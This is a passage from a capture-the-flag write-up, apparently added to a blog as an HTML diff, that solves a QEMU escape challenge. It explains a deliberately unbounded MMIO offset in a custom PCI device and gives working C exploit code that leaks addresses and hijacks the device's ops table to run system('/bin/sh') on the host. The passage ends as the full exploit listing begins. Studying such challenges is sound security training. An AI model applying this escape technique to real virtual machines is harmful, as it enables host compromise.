+</span></span><span class="line"><span class="cl">            <span class="nf">debug_printf</span><span class="p">(</span><span class="s">&#34;get_data (%p)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">[</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">[</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">pci_babydev_mmio_write</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">,</span> <span class="n">hwaddr</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PCIBabyDevState</span> <span class="o">*</span><span class="n">ms</span> <span class="o">=</span> <span class="n">opaque</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">PCIBabyDevReg</span> <span class="o">*</span><span class="n">reg</span> <span class="o">=</span> <span class="n">ms</span><span class="o">-&gt;</span><span class="n">reg_mmio</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">debug_printf</span><span class="p">(</span><span class="s">&#34;addr:%lx, size:%d, val:%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">switch</span><span class="p">(</span><span class="n">addr</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">MMIO_SET_OFFSET</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">reg</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">=</span> <span class="n">val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="n">MMIO_SET_OFFSET</span><span class="o">+</span><span class="mi">4</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">reg</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">|=</span> <span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">MMIO_SET_DATA</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">debug_printf</span><span class="p">(</span><span class="s">&#34;set_data (%p)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">[</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">[</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1UL</span> <span class="o">&lt;&lt;</span> <span class="n">size</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">|</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">[</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">]</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">((</span><span class="mi">1UL</span> <span class="o">&lt;&lt;</span> <span class="n">size</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Taking a look at the above challenge, there is a new QEMU PCI driver named <code>baby</code>, which have structure like below</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">PCIBabyDevState</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PCIDevice</span> <span class="n">parent_obj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">MemoryRegion</span> <span class="n">mmio</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">PCIBabyDevReg</span> <span class="o">*</span><span class="n">reg_mmio</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">buffer</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">PCIBabyDevReg</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">off_t</span> <span class="n">offset</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">uint32_t</span> <span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The driver exposes a mmio interface that allows us to interact with it. Looking at the source code, here are the key operations we can perform:</p>
+<ul>
+<li>We can write to the <code>MMIO_SET_OFFSET</code> register to configure the <code>reg_mmio-&gt;offset</code> value.</li>
+<li>We can read from the <code>MMIO_GET_DATA</code> register to access the contents of <code>buffer[reg_mmio-&gt;offset]</code>.</li>
+<li>We can write to the <code>MMIO_SET_DATA</code> register to modify the contents of <code>buffer[reg_mmio-&gt;offset]</code>.</li>
+<li>Due to the <code>access_size</code>, we can only read or write up to 4 bytes at a time.</li>
+</ul>
+<p>The bug in this driver is that there isn&rsquo;t any limit to the <code>reg_mmio-&gt;offset</code> that we set, which means we have OOB read and write. Using this bug, the goal of this challenge is to escape QEMU so that we can read the <code>flag</code> on the host.</p>
+<h3 id="solution">Solution</h3>
+<p>Let&rsquo;s start by checking the device name so that we can communicate with it. First, let&rsquo;s check the result of <code>lspci</code> inside QEMU:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># lspci
+</span></span><span class="line"><span class="cl">00:01.0 Class 0601: 8086:7000
+</span></span><span class="line"><span class="cl">00:04.0 Class 00ff: 4296:1338
+</span></span><span class="line"><span class="cl">00:00.0 Class 0600: 8086:1237
+</span></span><span class="line"><span class="cl">00:01.3 Class 0680: 8086:7113
+</span></span><span class="line"><span class="cl">00:03.0 Class 0200: 1af4:1000
+</span></span><span class="line"><span class="cl">00:01.1 Class 0101: 8086:7010
+</span></span><span class="line"><span class="cl">00:02.0 Class 0300: 1234:1111
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The device is <code>00:04</code> based on the vendor and device IDs defined in <code>baby.h</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define BABY_PCI_VENDOR_ID 0x4296
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define BABY_PCI_DEVICE_ID 0x1338
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then, we can start making a skeleton of the program to interact with the mmio pci driver.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/io.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;inttypes.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define MMIO_SET_OFFSET 0x0
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define MMIO_GET_DATA   0x8
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define MMIO_SET_DATA   0x8
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mmio_mem</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">mmio_write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">mmio_mem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">)</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">mmio_read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">mmio_mem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">mmio_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/sys/devices/pci0000:00/0000:00:04.0/resource0&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_SYNC</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">mmio_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;[!] Cannot open /sys/devices/pci0000:00/0000:00:04.0/resource0</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mmio_mem</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">mmio_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">mmio_mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;[!] mmio error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] mmio done</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, we can communicate with the mmio driver. Due to the bugs, we can set up another helper to do OOB read and write relative to the <code>buffer</code>. The idea is:</p>
+<ul>
+<li>To do OOB read, simply set the offset to the index that we want via <code>MMIO_SET_OFFSET</code>, and read the data via <code>MMIO_GET_DATA</code>.</li>
+<li>To do OOB write, simply set the offset to the index that we want via <code>MMIO_SET_OFFSET</code>, and write the data via <code>MMIO_SET_DATA</code>.</li>
+</ul>
+<p>Remember that we can only do reads and writes in 4-byte chunks, so in order to read or write a full 8 bytes, we need to do it twice (4 bytes at a time). Below is the helper that we made to make our life easier.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">weak_read_8</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offset</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_OFFSET</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">lower_val</span> <span class="o">=</span> <span class="nf">mmio_read</span><span class="p">(</span><span class="n">MMIO_GET_DATA</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_OFFSET</span><span class="p">,</span> <span class="n">offset</span><span class="o">+</span><span class="mi">4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lower_val</span> <span class="o">+=</span> <span class="p">((</span><span class="nf">mmio_read</span><span class="p">(</span><span class="n">MMIO_GET_DATA</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">lower_val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">weak_write_8</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_OFFSET</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_DATA</span><span class="p">,</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_OFFSET</span><span class="p">,</span> <span class="n">offset</span><span class="o">+</span><span class="mi">4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_DATA</span><span class="p">,</span> <span class="n">value</span><span class="o">&gt;&gt;</span><span class="mi">32</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">weak_write_4</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_OFFSET</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_DATA</span><span class="p">,</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now that we have relative read and write capabilities, the general goals to escape the driver are:</p>
+<ul>
+<li>We need to leak the <code>heap</code> address and <code>pie</code> address of QEMU.</li>
+<li>Next, we need to overwrite <code>mmio.ops</code> to point to our <code>fake_ops</code>.
+<ul>
+<li>Our <code>fake_ops</code> will overwrite <code>mmio_read</code> with <code>system</code> and keep <code>mmio_write</code> as it is (because we still need to be able to do relative writes).</li>
+</ul>
+</li>
+<li>Then, we need to set <code>mmio.opaque</code> to point to the string <code>/bin/sh</code>.
+<ul>
+<li>The reason is that when we call <code>mmio_read</code>, the register <code>rdi</code> contains the value stored in <code>mmio.opaque</code>.</li>
+</ul>
+</li>
+<li>Lastly, we simply trigger <code>mmio_read</code>, and due to the <code>fake_ops</code>, it will trigger <code>system(&quot;/bin/sh&quot;)</code>.</li>
+</ul>
+<p>Let&rsquo;s implement this in our exploit.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Get heap and pie leak
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint64_t</span> <span class="n">leaked_pie</span> <span class="o">=</span> <span class="nf">weak_read_8</span><span class="p">(</span><span class="o">-</span><span class="mh">0x90</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;leaked_pie = 0x%016lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leaked_pie</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">pie_base</span> <span class="o">=</span> <span class="n">leaked_pie</span> <span class="o">-</span> <span class="mh">0x72fa50</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;pie_base = 0x%016lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">pie_base</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">leaked_heap</span> <span class="o">=</span> <span class="nf">weak_read_8</span><span class="p">(</span><span class="o">-</span><span class="mh">0x8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;leaked_heap = 0x%016lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leaked_heap</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">buf_addr</span> <span class="o">=</span> <span class="n">leaked_heap</span> <span class="o">-</span> <span class="mh">0x1748</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Write /bin/sh in heap
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">weak_write_8</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x68732f6e69622f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">buf_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Create fake_ops in buffer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint64_t</span> <span class="n">mmio_write_addr</span> <span class="o">=</span> <span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x3ae1b0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">system_plt</span> <span class="o">=</span> <span class="n">pie_base</span><span class="o">+</span><span class="mh">0x324150</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">weak_write_8</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="n">system_plt</span><span class="p">);</span> <span class="c1">// mmio_read get overwritten to system
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">weak_write_8</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span> <span class="n">mmio_write_addr</span><span class="p">);</span> <span class="c1">// keep mmio_write because we still need it
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Overwrite mmio.ops to point to our fake_ops
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">weak_write_8</span><span class="p">(</span><span class="o">-</span><span class="mh">0xc8</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Make opaque point to our string /bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">weak_write_4</span><span class="p">(</span><span class="o">-</span><span class="mh">0xc0</span><span class="p">,</span> <span class="n">binsh_addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Spawn shell
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Trigger mmio_read&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_read</span><span class="p">(</span><span class="mh">0x0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now that we have the complete exploit, we can run it on the remote server to escape QEMU and get the flag. Below is the full exploit:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
